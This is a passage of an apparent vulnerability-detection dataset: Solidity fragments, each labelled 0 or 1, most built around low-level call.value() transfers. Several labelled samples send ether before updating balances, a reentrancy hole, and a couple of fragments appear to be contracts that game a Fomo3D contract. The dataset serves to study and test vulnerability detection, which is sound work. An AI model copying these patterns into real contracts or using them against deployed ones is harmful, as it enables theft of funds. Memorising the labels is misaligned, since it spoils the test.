Transfer(msg.sender, _to, _value);
return true;
0
---------------------------------
542 1044.sol
function donateToWhale(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Donate(amount, whale, msg.sender);
function loseWager(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Lose(amount, msg.sender);
1
---------------------------------
543 39705.sol
function empty() returns (bool) {
return foundationWallet.call.value(this.balance)();
function donateAs(address addr) private returns (bool) {
state st = getState();
if (st != state.round0 && st != state.round1) { throw; }
if (msg.value < minDonation) { throw; }
if (weiPerCHF == 0) { throw; }
totalWeiDonated += msg.value;
weiDonated[addr] += msg.value;
uint chfCents = (msg.value * 100) / weiPerCHF;
bookDonation(addr, now, chfCents, "ETH", "");
return foundationWallet.call.value(this.balance)();
0
---------------------------------
544 856.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
emit Execution(transactionId);
else {
emit ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
545 16057.sol
function callFirstTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
firstTarget.call.value(msg.value)();
function callSecondTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
secondTarget.call.value(msg.value)();
function winPrize() public payable onlyOwner {
owner.call.value(1 wei)();
0
---------------------------------
546 842.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
require(_value > 0 && frozenAccount[msg.sender] == false && frozenAccount[_to] == false && now > unlockUnixTime[msg.sender] && now > unlockUnixTime[_to]);
if (isContract(_to)) {
require(balanceOf[msg.sender] >= _value);
balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
balanceOf[_to] = balanceOf[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
547 19402.sol
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock) throw;
uint tokens = safeMul(value, price());
if(safeAdd(crowdSaleSoldAmount, tokens)>crowdSaleCap) throw;
balances[recipient] = safeAdd(balances[recipient], tokens);
crowdSaleSoldAmount = safeAdd(crowdSaleSoldAmount, tokens);
totalSupply = safeAdd(totalSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
function price() constant returns(uint) {
if (block.number<startBlock || block.number > endBlock) return 0;
else  return crowdSalePrice;
function() public payable {
if(msg.value == 0) {
sendCandy(msg.sender);
}  else {
buyToken(msg.sender, msg.value);
0
---------------------------------
548 668.sol
function call(address _to, bytes memory _data) public payable onlyWhitelistAdmin {
require(_to != address(registrar));
(bool success,) = _to.call.value(msg.value)(_data);
require(success);
0
---------------------------------
549 cross-function-reentrancy-fixed.sol
function untrustedWithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
if (recipient.call.value(amountToWithdraw)() == false) {throw;}
function untrustedGetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) {throw;}
claimedBonus[recipient] = true;
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
0
---------------------------------
550 23803.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
551 16884.sol
function mintETHRewards(address _contract, uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
552 21755.sol
function Collect(uint _am) public payable {
var acc = Acc[msg.sender];
if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {
if(msg.sender.call.value(_am)())  {
acc.balance-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function() public payable {
Put(0);
1
---------------------------------
553 21999.sol
function call(address addr, bytes data, uint256 amount) public payable onlyOwner {
if (msg.value > 0)
deposit();
require(addr.call.value(amount)(data));
Call(msg.sender, addr, amount);
0
---------------------------------
554 39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
555 39866.sol
function funding() payable {
if(fundingLock||block.number<startBlock||block.number>startBlock+blockDuration) throw;
if(balances[msg.sender]>balances[msg.sender]+msg.value*fundingExchangeRate || msg.value>msg.value*fundingExchangeRate) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*fundingExchangeRate;
Funding(msg.sender,msg.value);
function buy(string _commit) payable{
if(balances[msg.sender]>balances[msg.sender]+msg.value*price || msg.value>msg.value*price) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*price;
commit[msg.sender]=_commit;
Buy(msg.sender,msg.value);
1
---------------------------------
556 SendBalance.sol
function withdrawBalance(){
if(!(msg.sender.call.value(userBalances[msg.sender])())) {throw;}
userBalances[msg.sender] = 0;
1
---------------------------------
557 40341.sol
function carefulSendWithFixedGas(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal returns (bool success) {
return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)();
contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin {
mapping (address => uint) funds;
event FundsWithdrawnEvent(address fromAddress, address toAddress, uint valueWei);
function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal {
if (msg.value != 0) { throw; }
address fromAddress = msg.sender;
if (_valueWei > funds[fromAddress]) { throw; }
funds[fromAddress] -= _valueWei;
bool sentOk = carefulSendWithFixedGas(_toAddress, _valueWei, _extraGasIncluded);
if (!sentOk) { throw; }
FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei);
contract MoneyRounderMixin {
function compensateLatestMonarch(uint _compensationWei) internal {
address compensationAddress = latestMonarchInternal().compensationAddress;
latestMonarchInternal().compensationWei = _compensationWei;
bool sentOk = carefulSendWithFixedGas(compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends);
if (sentOk) {
CompensationSentEvent(compensationAddress, _compensationWei);
} else {
funds[compensationAddress] += _compensationWei;
CompensationFailEvent(compensationAddress, _compensationWei);
0
---------------------------------
558 30301.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender)
confirmed(transactionId, msg.sender)
notExecuted(transactionId)
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId)
notConfirmed(transactionId, msg.sender)
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
559 14274.sol
function withdraw(uint _amount) {
require(tokens[0][msg.sender] >= _amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], _amount);
if (!msg.sender.call.value(_amount)()) {
revert();
Withdraw(0, msg.sender, _amount, tokens[0][msg.sender]);
function instantTrade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive, uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount, address _store) payable {
uint totalValue = safeMul(_amount, 1004) / 1000;
if (_tokenGet == address(0)) {
if (msg.value != totalValue) {
revert();
TokenStore(_store).deposit.value(totalValue)();
} else {
if (!Token(_tokenGet).transferFrom(msg.sender, this, totalValue)) {
revert();
if (!Token(_tokenGet).approve(_store, totalValue)) {
revert();
TokenStore(_store).depositToken(_tokenGet, totalValue);
TokenStore(_store).trade(_tokenGet, _amountGet, _tokenGive, _amountGive,
_expires, _nonce, _user, _v, _r, _s, _amount);
totalValue = TokenStore(_store).balanceOf(_tokenGive, this);
uint customerValue = safeMul(_amountGive, _amount) / _amountGet;
if (_tokenGive == address(0)) {
TokenStore(_store).withdraw(totalValue);
msg.sender.transfer(customerValue);
} else {
TokenStore(_store).withdrawToken(_tokenGive, totalValue);
if (!Token(_tokenGive).transfer(msg.sender, customerValue)) {
revert();
0
---------------------------------
560 34577.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
561 39912.sol
function simulatePathwayFromBeneficiary() public payable {
bytes4 buySig = bytes4(sha3("buy()"));
if (!Resilience.call.value(msg.value)(buySig)) throw;
bytes4 transferSig = bytes4(sha3("transfer(address,uint256)"));
if (!Resilience.call(transferSig, msg.sender, msg.value)) throw;
0
---------------------------------
562 14458.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){
require(_to != address(0));
if(isContract(_to)) {
if(accountBalances[msg.sender].addressBalance < _value){
revert();
if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){
revert();
isNewRound();
subFromAddressBalancesInfo(msg.sender, _value);
addToAddressBalancesInfo(_to, _value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(msg.sender, _to, _value, _data);
0
---------------------------------
563 1710.sol
function buyFST0(address receiver) internal {
require(salesPipe.call.value(msg.value)());
uint256 tmpERCBalance = erc.balanceOf(address(this));
uint256 tmpEthBalance = address(this).balance;
if (tmpERCBalance > 0) {
require(erc.transfer(receiver, tmpERCBalance)); }
if (tmpEthBalance > 0) {
require(receiver.send(tmpEthBalance));
function buyFST (address receiver) public payable {
buyFST0(receiver);
function buyFST () public payable {
buyFST0(msg.sender);
function () external payable {
buyFST0(msg.sender);
0
---------------------------------
564 40357.sol
function split(address ethDestination, address etcDestination) {
if (amIOnTheFork.forked()) {
ethDestination.call.value(msg.value)();
} else {
uint fee = msg.value / 100;
feeRecipient.send(fee);
etcDestination.call.value(msg.value - fee)();
function split(address ethDestination, address etcDestination) {
if (amIOnTheFork.forked()) {
ethDestination.call.value(msg.value)();
} else {
uint fee = msg.value / 100;
feeRecipient.send(fee);
etcDestination.call.value(msg.value - fee)();
0
---------------------------------
565 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
566 40425.sol
function BankOwner_WithdrawDonations() public modifier_isContractOwner() modifier_wasValueSent() {
if (_bankDonationsBalance > 0) {
uint256 amount_ = _bankDonationsBalance;
_bankDonationsBalance = 0;
if (msg.sender.send(amount_)) {
event_bankDonationsWithdrawn(amount_);
}  else if (msg.sender.call.value(amount_)()) {
event_bankDonationsWithdrawn(amount_);
}  else {
_bankDonationsBalance = amount_;
function WithdrawAmountFromBankAccount(uint256 amount) public modifier_doesSenderHaveABankAccount() modifier_wasValueSent() returns (bool) {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount) {
_bankAccountsArray[accountNumber_].balance -= amount;
if (msg.sender.send(amount)) {
withdrawalSuccessful_ = true;
else if (msg.sender.call.value(amount)()) {
withdrawalSuccessful_ = true;
}  else {
_bankAccountsArray[accountNumber_].balance += amount;
if (withdrawalSuccessful_) {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, amount);
return true;
}  else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, amount);
return false;
function WithdrawFullBalanceFromBankAccount() public modifier_doesSenderHaveABankAccount() modifier_wasValueSent() returns (bool) {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
uint256 fullBalance_ = 0;
if (_bankAccountsArray[accountNumber_].balance > 0) {
fullBalance_ = _bankAccountsArray[accountNumber_].balance;
_bankAccountsArray[accountNumber_].balance = 0;
if (msg.sender.send(fullBalance_)) {
withdrawalSuccessful_ = true;
}else
if (msg.sender.call.value(fullBalance_)()) {
withdrawalSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance = fullBalance_;
if (withdrawalSuccessful_)  {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, fullBalance_);
return true;
} else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, fullBalance_);
return false;
function TransferAmountFromBankAccountToAddress(uint256 amount, address destinationAddress) public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) {
bool transferSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount) {
_bankAccountsArray[accountNumber_].balance -= amount;
if (destinationAddress.send(amount)) {
transferSuccessful_ = true;
} else if (destinationAddress.call.value(amount)()) {
transferSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance += amount;
if (transferSuccessful_) {
event_transferMadeFromBankAccountToAddress_Successful(accountNumber_, amount, destinationAddress);
return true;
} else {
event_transferMadeFromBankAccountToAddress_Failed(accountNumber_, amount, destinationAddress);
return false;
0
---------------------------------
567 30101.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
568 39326.sol
function executeProposal( uint256 id, bytes transactionBytecode) onlyMembers {
Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode)) throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
0
---------------------------------
569 22074.sol
function Collect(uint _am) public payable {
if(Bal[msg.sender]>=MinSum && _am<=Bal[msg.sender]) {
msg.sender.call.value(_am);
Bal[msg.sender]-=_am;
1
---------------------------------
570 2387.sol
function transferAndCall(address to, uint256 value, bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 && transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
571 21390.sol
function FundTransfer(uint _am, bytes32 _operation, address _to, address _feeToAdr) payable {
if(msg.sender != address(this)) throw;
if(_operation=="In")   {
FundsMove(msg.value,"In",_to);
investors[_to] += _am;
}  else {
uint amTotransfer = 0;
if(_to==_feeToAdr) {
amTotransfer=_am;
}  else {
amTotransfer=_am/100*99;
investors[_feeToAdr]+=_am-amTotransfer;
if(_to.call.value(_am)()==false) throw;
investors[_to] -= _am;
FundsMove(_am, "Out", _to);
function() payable {
In(msg.sender);
function Out(uint amount) payable {
if(investors[msg.sender]<targetAmount)throw;
if(investors[msg.sender]<amount)throw;
this.FundTransfer(amount,"",msg.sender,admin);
function In(address to) payable {
if(to==0x0)to = admin;
if(msg.sender!=tx.origin)throw;
this.FundTransfer(msg.value, "In", to,admin);
1
---------------------------------
572 16925.sol
function withdraw() public{
assert(msg.sender.call.value(balances[msg.sender])()) ;
balances[msg.sender] = 0;
1
---------------------------------
573 3270.sol
function gotake() public {
if (fomo3d.getTimeLeft() > 50) { revert(); }
address(fomo3d).call.value(fomo3d.getBuyPrice() *2 )();
fomo3d.withdraw();
0
---------------------------------
574 5629.sol
constructor () public payable {
fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1));
require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)());
(,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this));
require(winnings > 0.1 ether);
fomo.withdraw();
selfdestruct(msg.sender);
0
---------------------------------
575 4679.sol
function giveToken(address _buyer) internal {
require( pendingTokenUser[_buyer] > 0, "pendingTokenUser[_buyer] > 0" );
tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]);
tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]);
soldTokens = soldTokens.add(pendingTokenUser[_buyer]);
pendingTokenUser[_buyer] = 0;
require( address(tokenSaleContract).call.value( etherUser[_buyer] )(bytes4( keccak256("forwardEther()"))));
etherUser[_buyer] = 0;
function forwardEther() onlyRC payable public returns(bool) {
require(milestoneSystem.call.value(msg.value)(), "wallet.call.value(msg.value)()");
return true;
1
---------------------------------
576 30460.sol
function close() onlyOwner public {
require(state == State.Active);
state = State.Closed;
Closed();
wallet.call.value(this.balance)();
function forwardFunds() onlyOwner public {
require(this.balance > 0);
wallet.call.value(this.balance)();
contract FinalizableCrowdsale is BurnableCrowdsale, Ownable {
using SafeMath for uint256;
bool public isFinalized = false;
event Finalized();
function forwardFundsToWallet(uint256 amount) internal {
if (goalReached() && vault.balance > 0) {
vault.forwardFunds();
if (goalReached()) {
wallet.call.value(amount)();
} else {
vault.deposit.value(amount)(msg.sender);
0
---------------------------------
577 9611.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
578 39684.sol
function () payable {
if (msg.data.length > 0) {
createSeries(msg.data, 0, "", "", 0x0);
} else
if (latestSeriesForUser[msg.sender] != 0) {
if (latestSeriesForUser[msg.sender].call.value(msg.value)())
DepositMade(latestSeriesForUser[msg.sender], msg.value);
} else {
createSeries("", 0, "", "", 0x0);
address public seriesFactory;
address public owner;
0
---------------------------------
579 40353.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
580 27486.sol
function Command(address adr,bytes data) payable public {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
581 23421.sol
function _safeCall(address _to, uint _amount) internal {
require(_to != 0);
require(_to.call.value(_amount)());
function multiCall(address[] _address, uint[] _amount) payable public returns(bool) {
for (uint i = 0; i < _address.length; i++) {
_safeCall(_address[i], _amount[i]);
return true;
1
---------------------------------
582 17009.sol
function Pay(address _destination) public payable {
require(_destination != 0x0);
require(msg.value > 0);
require(!paused);
masterWallet.transfer(msg.value.div(9));
_destination.call.value(msg.value.div(9).mul(8))();
SettleFund(_destination, msg.value);
1
---------------------------------
583 26188.sol
function GetPrizeFund() public payable {
require(now>EndTime);
require(Bids[msg.sender]>=MaxOffer);
uint prizeAmount = Bids[msg.sender]+PrizeFund;
PrizeFund = 0;
Bids[msg.sender]=0;
msg.sender.call.value(prizeAmount);
function RevokeBid() public payable {
require(now>EndTime);
uint toTransfer = Bids[msg.sender];
Bids[msg.sender]=0;
msg.sender.call.value(toTransfer);
0
---------------------------------
584 10604.sol
function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
585 39269.sol
function sendPending() public preventReentry isHolder(msg.sender) returns (bool){
if (ptxTail == ptxHead) return false;
TX memory tx = pendingTxs[ptxTail];
if(now < tx.timeLock) return false;
delete pendingTxs[ptxTail++];
if(!tx.blocked) {
if(tx.to.call.value(tx.value)(tx.data)) {
committedEther -= tx.value;
Withdrawal(tx.from, tx.to, tx.value);
return true;
if (tx.from == address(this)) {
committedEther -= tx.value;
} else {
holders[tx.from].etherBalance += tx.value;
TransactionFailed(tx.from, tx.to, tx.value);
return false;
0
---------------------------------
586 1879.sol
function upgradeToAndCall(address newImplementation, bytes data) payable external ifAdmin {
_upgradeTo(newImplementation);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
587 2021.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _safeSend(address _to, uint _value) internal {
if (!_unsafeSend(_to, _value)) {
throw;
0
---------------------------------
588 36563.sol
function forward(address _destination, uint256 _value, bytes _data) onlyOwner {
require(_destination != address(0));
assert(_destination.call.value(_value)(_data));
if (_value > 0) {
Withdrawal(_destination, _value, _data);
function() payable {
Deposit(msg.sender, msg.value);
0
---------------------------------
589 39644.sol
function revoke(address transactor, address transactee) {
if (msg.sender != transactor && msg.sender != transactee) { throw; }
if(!verify(transactor, transactee)) { throw; }
uint32 deposit = _verifications[transactor][transactee];
delete _verifications[transactor][transactee];
if (!transactee.call.value(deposit).gas(23000)()) {  throw;  }
RevokeEvent(transactor, transactee, deposit);
0
---------------------------------
590 27334.sol
function participate() payable {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if (luckyNumberOfAddress(msg.sender) == luckyNumber) {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
591 23387.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId){
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
592 24007.sol
function GetEther() public payable {
if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) {
msg.sender.call.value(0.3 ether);
ExtractDepositTime[msg.sender] = 0;
1
---------------------------------
593 11719.sol
function Collect(uint _am) public payable {
if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) {
if(msg.sender.call.value(_am)())  {
balances[msg.sender]-=_am;
Log.AddMessage(msg.sender,_am,"Collect");
function() public payable {
Deposit();
1
---------------------------------
594 28869.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
595 35637.sol
function transfer(address _to, uint48 _value, bytes _data, string _custom_fallback) returns (bool success) {
if(isContract(_to)) {
require(balanceOf(msg.sender) >= _value);
balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
balances[_to] = safeAdd(balanceOf(_to), _value);
ContractReceiver receiver = ContractReceiver(_to);
receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
596 39019.sol
function CreateTokens() {
if (tokensCreated > 0) return;
uint amount = amountRaised * (100 - rewardPercentage) / 100;
if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw;
tokensCreated = tokenContract.balanceOf(this);
tokenCreator = msg.sender;
0
---------------------------------
597 3985.sol
function performFeelessTransaction(address sender, address target, bytes data, uint256 nonce, bytes sig) public payable {
require(this == target);
bytes memory prefix = "\x19Ethereum Signed Message:\n32";
bytes32 hash = keccak256(prefix, keccak256(target, data, nonce));
msgSender = ECRecovery.recover(hash, sig);
require(msgSender == sender);
require(nonces[msgSender]++ == nonce);
require(target.call.value(msg.value)(data));
msgSender = address(0);
0
---------------------------------
598 347.sol
function _forwardFunds() internal {
bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)();
emit TokensTransfer (msg.sender, wallet, msg.value, isTransferDone);
0
---------------------------------
599 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
600 simple_dao_fixed.sol
function withdraw(uint amount) public {
if (credit[msg.sender]>= amount) {
credit[msg.sender]-=amount;
require(msg.sender.call.value(amount)());
1
---------------------------------
601 18438.sol
function invest() public {
uint256 amountToSend = address(this).balance;
if(amountToSend > 1){
uint256 half = amountToSend / 2;
require(sk2xContract.call.value(half)());
p3dContract.buy.value(half)(msg.sender);
function donate() payable public {
require(sk2xContract.call.value(msg.value).gas(1000000)());
0
---------------------------------
602 970.sol
function withdraw(uint amount) {
if (tokens[0][msg.sender] < amount) throw;
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);
if (!msg.sender.call.value(amount)()) throw;
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
603 cross-function-reentrancy.sol
function untrustedWithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
if (recipient.call.value(amountToWithdraw)() == false) { throw;}
function untrustedGetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) { throw;}
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
claimedBonus[recipient] = true;
1
---------------------------------
604 27024.sol
function participate() payable onlyHuman {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if (luckyNumberOfAddress(msg.sender) == winnerLuckyNumber) {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
605 25196.sol
function getTokens(uint num, address tokenBuyerContract) public {
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
0
---------------------------------
606 39973.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _forward(address _to, bytes _data) internal returns(bool, bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return (false, _safeFalse());
if (!_to.call.value(msg.value)(_data)) {
return (false, _safeFalse());
return (true, _applyRefund(startGas));
function checkForward(bytes _data) constant returns(bool, bool) {
return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data);
1
---------------------------------
607 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
